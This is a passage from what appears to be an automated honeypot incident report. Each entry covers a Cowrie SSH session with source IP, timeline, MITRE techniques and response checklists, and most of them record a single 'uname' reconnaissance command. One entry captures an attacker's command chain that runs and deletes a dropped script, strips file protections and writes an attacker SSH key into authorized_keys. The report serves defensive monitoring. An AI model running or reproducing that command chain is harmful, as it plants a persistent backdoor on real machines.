**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ff0b57c2fa6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:11 |
| **Last Seen** | 2026-07-28 05:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:11:24` | `cowrie.session.connect` |
| `2026-07-28 05:11:25` | `cowrie.client.version` |
| `2026-07-28 05:11:25` | `cowrie.client.kex` |
| `2026-07-28 05:11:26` | `cowrie.login.success` |
| `2026-07-28 05:11:28` | `cowrie.session.params` |
| `2026-07-28 05:11:28` | `cowrie.command.input` |
| `2026-07-28 05:11:29` | `cowrie.log.closed` |
| `2026-07-28 05:11:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9639df6b765

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:11 |
| **Last Seen** | 2026-07-28 05:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:11:30` | `cowrie.session.connect` |
| `2026-07-28 05:11:31` | `cowrie.client.version` |
| `2026-07-28 05:11:31` | `cowrie.client.kex` |
| `2026-07-28 05:11:32` | `cowrie.login.success` |
| `2026-07-28 05:11:34` | `cowrie.session.params` |
| `2026-07-28 05:11:34` | `cowrie.command.input` |
| `2026-07-28 05:11:35` | `cowrie.log.closed` |
| `2026-07-28 05:11:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2224b52a2d13

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:11 |
| **Last Seen** | 2026-07-28 05:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:11:36` | `cowrie.session.connect` |
| `2026-07-28 05:11:37` | `cowrie.client.version` |
| `2026-07-28 05:11:37` | `cowrie.client.kex` |
| `2026-07-28 05:11:40` | `cowrie.login.success` |
| `2026-07-28 05:11:42` | `cowrie.session.params` |
| `2026-07-28 05:11:42` | `cowrie.command.input` |
| `2026-07-28 05:11:43` | `cowrie.log.closed` |
| `2026-07-28 05:11:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3b4a063a343

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:11 |
| **Last Seen** | 2026-07-28 05:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:11:42` | `cowrie.session.connect` |
| `2026-07-28 05:11:42` | `cowrie.client.version` |
| `2026-07-28 05:11:42` | `cowrie.client.kex` |
| `2026-07-28 05:11:46` | `cowrie.login.success` |
| `2026-07-28 05:11:49` | `cowrie.session.params` |
| `2026-07-28 05:11:49` | `cowrie.command.input` |
| `2026-07-28 05:11:49` | `cowrie.log.closed` |
| `2026-07-28 05:11:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9c861dd93b8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:11 |
| **Last Seen** | 2026-07-28 05:12 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:11:48` | `cowrie.session.connect` |
| `2026-07-28 05:11:49` | `cowrie.client.version` |
| `2026-07-28 05:11:49` | `cowrie.client.kex` |
| `2026-07-28 05:11:53` | `cowrie.login.success` |
| `2026-07-28 05:11:56` | `cowrie.session.params` |
| `2026-07-28 05:11:56` | `cowrie.command.input` |
| `2026-07-28 05:12:00` | `cowrie.log.closed` |
| `2026-07-28 05:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10618a3a38a5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:11 |
| **Last Seen** | 2026-07-28 05:12 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:11:53` | `cowrie.session.connect` |
| `2026-07-28 05:11:54` | `cowrie.client.version` |
| `2026-07-28 05:11:54` | `cowrie.client.kex` |
| `2026-07-28 05:12:03` | `cowrie.login.success` |
| `2026-07-28 05:12:07` | `cowrie.session.params` |
| `2026-07-28 05:12:07` | `cowrie.command.input` |
| `2026-07-28 05:12:08` | `cowrie.log.closed` |
| `2026-07-28 05:12:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e107db8b12b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:11 |
| **Last Seen** | 2026-07-28 05:12 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:11:59` | `cowrie.session.connect` |
| `2026-07-28 05:12:00` | `cowrie.client.version` |
| `2026-07-28 05:12:00` | `cowrie.client.kex` |
| `2026-07-28 05:12:07` | `cowrie.login.success` |
| `2026-07-28 05:12:10` | `cowrie.session.params` |
| `2026-07-28 05:12:10` | `cowrie.command.input` |
| `2026-07-28 05:12:12` | `cowrie.log.closed` |
| `2026-07-28 05:12:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17a18d979171

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:12 |
| **Last Seen** | 2026-07-28 05:12 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:12:05` | `cowrie.session.connect` |
| `2026-07-28 05:12:07` | `cowrie.client.version` |
| `2026-07-28 05:12:07` | `cowrie.client.kex` |
| `2026-07-28 05:12:13` | `cowrie.login.success` |
| `2026-07-28 05:12:17` | `cowrie.session.params` |
| `2026-07-28 05:12:17` | `cowrie.command.input` |
| `2026-07-28 05:12:19` | `cowrie.log.closed` |
| `2026-07-28 05:12:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be35c2221862

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:12 |
| **Last Seen** | 2026-07-28 05:12 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:12:11` | `cowrie.session.connect` |
| `2026-07-28 05:12:13` | `cowrie.client.version` |
| `2026-07-28 05:12:13` | `cowrie.client.kex` |
| `2026-07-28 05:12:20` | `cowrie.login.success` |
| `2026-07-28 05:12:24` | `cowrie.session.params` |
| `2026-07-28 05:12:24` | `cowrie.command.input` |
| `2026-07-28 05:12:25` | `cowrie.log.closed` |
| `2026-07-28 05:12:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7234237dca72

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-07-28 05:12 |
| **Last Seen** | 2026-07-28 05:12 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:12:15` | `cowrie.session.connect` |
| `2026-07-28 05:12:17` | `cowrie.client.version` |
| `2026-07-28 05:12:17` | `cowrie.client.kex` |
| `2026-07-28 05:12:28` | `cowrie.login.success` |
| `2026-07-28 05:12:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a2c7e6d5a95

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:12 |
| **Last Seen** | 2026-07-28 05:12 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:12:16` | `cowrie.session.connect` |
| `2026-07-28 05:12:17` | `cowrie.client.version` |
| `2026-07-28 05:12:17` | `cowrie.client.kex` |
| `2026-07-28 05:12:24` | `cowrie.login.success` |
| `2026-07-28 05:12:27` | `cowrie.session.params` |
| `2026-07-28 05:12:27` | `cowrie.command.input` |
| `2026-07-28 05:12:28` | `cowrie.log.closed` |
| `2026-07-28 05:12:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f8379373a4f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:12 |
| **Last Seen** | 2026-07-28 05:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:12:24` | `cowrie.session.connect` |
| `2026-07-28 05:12:24` | `cowrie.client.version` |
| `2026-07-28 05:12:24` | `cowrie.client.kex` |
| `2026-07-28 05:12:29` | `cowrie.login.success` |
| `2026-07-28 05:12:32` | `cowrie.session.params` |
| `2026-07-28 05:12:32` | `cowrie.command.input` |
| `2026-07-28 05:12:33` | `cowrie.log.closed` |
| `2026-07-28 05:12:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61614af35207

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:12 |
| **Last Seen** | 2026-07-28 05:12 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:12:29` | `cowrie.session.connect` |
| `2026-07-28 05:12:30` | `cowrie.client.version` |
| `2026-07-28 05:12:30` | `cowrie.client.kex` |
| `2026-07-28 05:12:36` | `cowrie.login.success` |
| `2026-07-28 05:12:39` | `cowrie.session.params` |
| `2026-07-28 05:12:39` | `cowrie.command.input` |
| `2026-07-28 05:12:40` | `cowrie.log.closed` |
| `2026-07-28 05:12:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ef8a3d3fdcb

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-07-28 05:12 |
| **Last Seen** | 2026-07-28 05:13 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.s` |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:12:33` | `cowrie.session.connect` |
| `2026-07-28 05:12:33` | `cowrie.client.version` |
| `2026-07-28 05:12:33` | `cowrie.client.kex` |
| `2026-07-28 05:12:34` | `cowrie.login.success` |
| `2026-07-28 05:13:13` | `cowrie.session.params` |
| `2026-07-28 05:13:13` | `cowrie.command.input` |
| `2026-07-28 05:13:13` | `cowrie.log.closed` |
| `2026-07-28 05:13:13` | `cowrie.session.file_upload` |
| `2026-07-28 05:13:13` | `cowrie.session.file_upload` |
| `2026-07-28 05:13:13` | `cowrie.session.file_upload` |
| `2026-07-28 05:13:13` | `cowrie.session.file_upload` |
| `2026-07-28 05:13:13` | `cowrie.session.file_upload` |
| `2026-07-28 05:13:13` | `cowrie.session.file_upload` |
| `2026-07-28 05:13:13` | `cowrie.session.file_upload` |
| `2026-07-28 05:13:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5f9e627e356

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:12 |
| **Last Seen** | 2026-07-28 05:12 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:12:35` | `cowrie.session.connect` |
| `2026-07-28 05:12:36` | `cowrie.client.version` |
| `2026-07-28 05:12:36` | `cowrie.client.kex` |
| `2026-07-28 05:12:42` | `cowrie.login.success` |
| `2026-07-28 05:12:46` | `cowrie.session.params` |
| `2026-07-28 05:12:46` | `cowrie.command.input` |
| `2026-07-28 05:12:47` | `cowrie.log.closed` |
| `2026-07-28 05:12:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a44900f8f80

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:12 |
| **Last Seen** | 2026-07-28 05:12 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:12:39` | `cowrie.session.connect` |
| `2026-07-28 05:12:41` | `cowrie.client.version` |
| `2026-07-28 05:12:41` | `cowrie.client.kex` |
| `2026-07-28 05:12:47` | `cowrie.login.success` |
| `2026-07-28 05:12:52` | `cowrie.session.params` |
| `2026-07-28 05:12:52` | `cowrie.command.input` |
| `2026-07-28 05:12:53` | `cowrie.log.closed` |
| `2026-07-28 05:12:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fed3e55bb220

| Field | Detail |
|---|---|
| **Source IP** | `34.156.77[.]158` |
| **First Seen** | 2026-07-28 05:12 |
| **Last Seen** | 2026-07-28 05:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:12:39` | `cowrie.session.connect` |
| `2026-07-28 05:12:39` | `cowrie.login.success` |
| `2026-07-28 05:12:40` | `cowrie.session.params` |
| `2026-07-28 05:12:40` | `cowrie.command.input` |
| `2026-07-28 05:12:40` | `cowrie.command.input` |
| `2026-07-28 05:12:40` | `cowrie.command.failed` |
| `2026-07-28 05:12:40` | `cowrie.command.input` |
| `2026-07-28 05:12:40` | `cowrie.log.closed` |
| `2026-07-28 05:12:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.77[.]158` to AbuseIPDB if not already reported
- [ ] Block `34.156.77[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89b9b378a20c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:12 |
| **Last Seen** | 2026-07-28 05:12 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:12:46` | `cowrie.session.connect` |
| `2026-07-28 05:12:47` | `cowrie.client.version` |
| `2026-07-28 05:12:47` | `cowrie.client.kex` |
| `2026-07-28 05:12:54` | `cowrie.login.success` |
| `2026-07-28 05:12:56` | `cowrie.session.params` |
| `2026-07-28 05:12:56` | `cowrie.command.input` |
| `2026-07-28 05:12:58` | `cowrie.log.closed` |
| `2026-07-28 05:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75384d3e6f93

| Field | Detail |
|---|---|
| **Source IP** | `34.156.77[.]158` |
| **First Seen** | 2026-07-28 05:12 |
| **Last Seen** | 2026-07-28 05:13 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:12:48` | `cowrie.session.connect` |
| `2026-07-28 05:12:48` | `cowrie.login.success` |
| `2026-07-28 05:12:49` | `cowrie.session.params` |
| `2026-07-28 05:12:49` | `cowrie.command.input` |
| `2026-07-28 05:12:49` | `cowrie.command.failed` |
| `2026-07-28 05:13:04` | `cowrie.log.closed` |
| `2026-07-28 05:13:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.77[.]158` to AbuseIPDB if not already reported
- [ ] Block `34.156.77[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60912ff821b0

| Field | Detail |
|---|---|
| **Source IP** | `34.156.77[.]158` |
| **First Seen** | 2026-07-28 05:12 |
| **Last Seen** | 2026-07-28 05:13 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:12:50` | `cowrie.session.connect` |
| `2026-07-28 05:12:50` | `cowrie.login.success` |
| `2026-07-28 05:12:51` | `cowrie.session.params` |
| `2026-07-28 05:12:51` | `cowrie.command.input` |
| `2026-07-28 05:13:04` | `cowrie.log.closed` |
| `2026-07-28 05:13:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.77[.]158` to AbuseIPDB if not already reported
- [ ] Block `34.156.77[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-334bfff4f3ee

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:12 |
| **Last Seen** | 2026-07-28 05:13 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:12:53` | `cowrie.session.connect` |
| `2026-07-28 05:12:54` | `cowrie.client.version` |
| `2026-07-28 05:12:54` | `cowrie.client.kex` |
| `2026-07-28 05:12:59` | `cowrie.login.success` |
| `2026-07-28 05:13:03` | `cowrie.session.params` |
| `2026-07-28 05:13:03` | `cowrie.command.input` |
| `2026-07-28 05:13:05` | `cowrie.log.closed` |
| `2026-07-28 05:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2d3e931f67f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:12 |
| **Last Seen** | 2026-07-28 05:13 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:12:58` | `cowrie.session.connect` |
| `2026-07-28 05:12:59` | `cowrie.client.version` |
| `2026-07-28 05:12:59` | `cowrie.client.kex` |
| `2026-07-28 05:13:07` | `cowrie.login.success` |
| `2026-07-28 05:13:11` | `cowrie.session.params` |
| `2026-07-28 05:13:11` | `cowrie.command.input` |
| `2026-07-28 05:13:14` | `cowrie.log.closed` |
| `2026-07-28 05:13:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b3ee3eb8c33

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:13 |
| **Last Seen** | 2026-07-28 05:13 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:13:03` | `cowrie.session.connect` |
| `2026-07-28 05:13:05` | `cowrie.client.version` |
| `2026-07-28 05:13:05` | `cowrie.client.kex` |
| `2026-07-28 05:13:13` | `cowrie.login.success` |
| `2026-07-28 05:13:18` | `cowrie.session.params` |
| `2026-07-28 05:13:18` | `cowrie.command.input` |
| `2026-07-28 05:13:20` | `cowrie.log.closed` |
| `2026-07-28 05:13:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f683a1ee7b48

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:13 |
| **Last Seen** | 2026-07-28 05:13 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:13:08` | `cowrie.session.connect` |
| `2026-07-28 05:13:10` | `cowrie.client.version` |
| `2026-07-28 05:13:10` | `cowrie.client.kex` |
| `2026-07-28 05:13:18` | `cowrie.login.success` |
| `2026-07-28 05:13:22` | `cowrie.session.params` |
| `2026-07-28 05:13:22` | `cowrie.command.input` |
| `2026-07-28 05:13:24` | `cowrie.log.closed` |
| `2026-07-28 05:13:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e9d309da9f6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:13 |
| **Last Seen** | 2026-07-28 05:13 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:13:15` | `cowrie.session.connect` |
| `2026-07-28 05:13:17` | `cowrie.client.version` |
| `2026-07-28 05:13:17` | `cowrie.client.kex` |
| `2026-07-28 05:13:25` | `cowrie.login.success` |
